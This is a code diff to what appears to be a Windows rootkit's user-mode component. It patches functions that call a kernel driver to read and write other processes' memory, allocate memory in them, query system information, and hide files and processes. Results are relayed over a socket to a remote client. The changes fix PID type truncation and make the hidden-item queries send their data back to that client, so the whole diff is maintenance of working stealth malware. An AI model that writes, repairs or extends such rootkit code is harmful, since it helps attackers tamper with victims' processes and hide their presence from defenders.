@@ -72,9 +72,9 @@ int CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HA
 
 int InitialKernelCall(HANDLE* PipeHandle, LogFile* MediumLog) {
 	ROOTKIT_MEMORY InitData = { 0 };
-	InitData.MedPID = (USHORT)GetCurrentProcessId();
-	InitData.MainPID = (USHORT)GetPID("meow_client.exe");
-	InitData.SemiPID = (USHORT)GetPID("powershell.exe");
+	InitData.MedPID = (ULONG64)GetCurrentProcessId();
+	InitData.MainPID = (ULONG64)GetPID("meow_client.exe");
+	InitData.SemiPID = (ULONG64)GetPID("powershell.exe");
 	if (InitData.SemiPID == NULL || InitData.MainPID == NULL) {
 		return 0;
 	}
@@ -84,8 +84,8 @@ int InitialKernelCall(HANDLE* PipeHandle, LogFile* MediumLog) {
 
 int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog) {
 	PASS_DATA result;
-	std::uint32_t SrcPID = NULL;
-	std::uint32_t DstPID = NULL;
+	ULONG64 SrcPID = 0;
+	ULONG64 DstPID = 0;
 	PVOID LocalWrite = NULL;
 	PVOID WriteToMdl = NULL;
 	const char* MagicMdl = "mymyymym";
@@ -159,10 +159,10 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 
 		// Writing source module PID -
 		if (strcmp(RootkInst->MdlName, MagicMdl) == 0 || strcmp(RootkInst->MdlName, "regular") == 0) {
-			SrcPID = GetCurrentProcessId();
+			SrcPID = (ULONG64)GetCurrentProcessId();
 		}
 		else {
-			SrcPID = GetPID(RootkInst->MdlName);
+			SrcPID = (ULONG64)GetPID(RootkInst->MdlName);
 		}
 
 		if (SrcPID == NULL) {
@@ -173,11 +173,11 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 		// Writing destination module PID -
 		if (Err == successful) {
 			if (strcmp(RootkInst->DstMdlName, MagicMdl) == 0) {
-				DstPID = GetCurrentProcessId();
+				DstPID = (ULONG64)GetCurrentProcessId();
 			}
 
 			else {
-				DstPID = GetPID(RootkInst->DstMdlName);
+				DstPID = (ULONG64)GetPID(RootkInst->DstMdlName);
 			}
 
 			if (DstPID == NULL) {
@@ -193,7 +193,7 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 	if (Err == successful) {
 		RootkInst->MainPID = DstPID;
 		RootkInst->SemiPID = SrcPID;
-		RootkInst->MedPID = GetCurrentProcessId();
+		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		RootkInst->IsFlexible = TRUE;
 		int DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
@@ -216,8 +216,8 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 
 int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
 	PASS_DATA result;
-	std::uint32_t PrcID;
-	std::uint32_t DstID;
+	ULONG64 PrcID = 0;
+	ULONG64 DstID = 0;
 	const char* MagicMdl = "mymyymym";
 	ROOTKIT_UNEXERR Err = successful;
 	int KrnlRes = 0;
@@ -243,17 +243,17 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 
 	// Configure reading source and destination PIDs -
 	if (Err == successful) {
-		DstID = GetCurrentProcessId();
+		DstID = (ULONG64)GetCurrentProcessId();
 		if (DstID == NULL) {
 			Err = relevantpid;
 		}
 
 		if (Err == successful) {
 			if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
-				PrcID = GetCurrentProcessId();
+				PrcID = (ULONG64)GetCurrentProcessId();
 			}
 			else {
-				PrcID = GetPID(RootkInst->MdlName);
+				PrcID = (ULONG64)GetPID(RootkInst->MdlName);
 			}
 
 			if (PrcID == NULL) {
@@ -267,7 +267,7 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 		RootkInst->Out = LocalRead;
 		RootkInst->MainPID = PrcID;
 		RootkInst->SemiPID = DstID;
-		RootkInst->MedPID = GetCurrentProcessId();
+		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		RootkInst->IsFlexible = TRUE;
 		KrnlRes = CallKernelDriver(tosock, RootkInst, FALSE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
@@ -304,7 +304,7 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
 	PASS_DATA result;
 	const char* MagicMdl = "mymyymym";
-	USHORT PID;
+	ULONG64 PID = 0;
 	int DriverRes = FALSE;
 
 
@@ -318,10 +318,10 @@ int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName
 
 	// Get module PID -
 	if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
-		PID = (USHORT)GetCurrentProcessId();
+		PID = (ULONG64)GetCurrentProcessId();
 	}
 	else {
-		PID = (USHORT)GetPID(RootkInst->MdlName);
+		PID = (ULONG64)GetPID(RootkInst->MdlName);
 	}
 
 	if (PID != NULL) {
@@ -329,7 +329,7 @@ int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName
 
 		RootkInst->Unexpected = successful;
 		RootkInst->MainPID = PID;
-		RootkInst->MedPID = GetCurrentProcessId();
+		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		RootkInst->IsFlexible = TRUE;
 		DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
@@ -354,7 +354,6 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 	ULONG64 TotalSize = 0;
 	ULONG FailedSize = 12323;
 	char FailedBuffer = 12;
-	// RKSYSTEM_INFORMATION_CLASS CurrInf;
 	int KrnlRes = FALSE;
 
 
@@ -379,8 +378,8 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 	RootkInst->Unexpected = successful;
 	RootkInst->Operation = RKOP_SYSINFO;
 	RootkInst->Buffer = AttrBuffer;
-	RootkInst->MainPID = (USHORT)GetCurrentProcessId();
-	RootkInst->MedPID = GetCurrentProcessId();
+	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
+	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 	RootkInst->Size = AttrBufferSize;
 	RootkInst->IsFlexible = TRUE;
 	KrnlRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
@@ -424,7 +423,7 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 
 int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog){
 	PASS_DATA result;
-	USHORT PID = 0;
+	ULONG64 PID = 0;
 	int DriverRes = FALSE;
 	PVOID InitAddr = NULL;
 	char FailedSize = 1;
@@ -439,10 +438,10 @@ int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNa
 
 	// Get PID of the process allocating memory into -
 	if (strcmp(ModuleName, "mymyymym") == 0) {
-		PID = (USHORT)GetCurrentProcessId();
+		PID = (ULONG64)GetCurrentProcessId();
 	}
 	else {
-		PID = (USHORT)GetPID(ModuleName);
+		PID = (ULONG64)GetPID(ModuleName);
 	}
 
 
@@ -451,7 +450,7 @@ int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNa
 		RootkInst->Unexpected = successful;
 		RootkInst->MdlName = ModuleName;
 		RootkInst->MainPID = PID;
-		RootkInst->MedPID = GetCurrentProcessId();
+		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
 			printf("transformation of regular data from KM-UM confirmed!\n");
@@ -524,8 +523,8 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 	// Pass struct argument to the driver:
 	RootkInst->Unexpected = successful;
 	RootkInst->MdlName = ModuleName;
-	RootkInst->MainPID = (USHORT)GetCurrentProcessId();;
-	RootkInst->MedPID = (USHORT)GetCurrentProcessId();;
+	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
+	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
 		printf("transformation of regular data from KM-UM confirmed!\n");
@@ -536,8 +535,8 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 
 
 	// Parse returned data correctly (after sending back main struct):
-	if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
-		result = root_internet::RecvData(tosock, RootkInst->Size, RootkInst->Out, FALSE, 0);
+	if (RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
+		result = root_internet::SendData(tosock, RootkInst->Out, (int)RootkInst->Size, FALSE, 0);
 		if (result.err || result.value != RootkInst->Size) {
 			return 0;
 		}
@@ -580,7 +579,7 @@ int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Module
 	// Pass struct argument to the driver:
 	RootkInst->Unexpected = successful;
 	RootkInst->MdlName = ModuleName;
-	RootkInst->MedPID = (USHORT)GetCurrentProcessId();;
+	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
 	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
 		printf("transformation of regular data from KM-UM confirmed!\n");
@@ -591,8 +590,8 @@ int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Module
 
 
 	// Parse returned data correctly (after sending back main struct):
-	if (RequestStatus == SHOWHIDDEN_PROCESS) {
-		result = root_internet::RecvData(tosock, RootkInst->Size, RootkInst->Out, FALSE, 0);
+	if (RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
+		result = root_internet::SendData(tosock, RootkInst->Out, RootkInst->Size, FALSE, 0);
 		if (result.err || result.value != RootkInst->Size) {
 			return 0;
 		}
